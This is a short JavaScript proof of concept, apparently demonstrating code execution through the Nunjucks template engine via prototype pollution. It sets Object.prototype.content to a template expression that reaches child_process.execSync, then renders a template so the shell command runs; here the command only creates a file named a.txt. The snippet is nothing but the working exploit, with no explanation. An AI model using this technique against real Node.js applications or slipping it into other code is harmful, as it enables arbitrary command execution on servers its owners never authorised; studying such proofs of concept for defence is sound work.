const nunjucks = require("nunjucks");

Object.prototype.content = " function(){ return global.process.mainModule.require('child_process').execSync('touch a.txt') }() ";

nunjucks.compile(" {{ content }} ").render();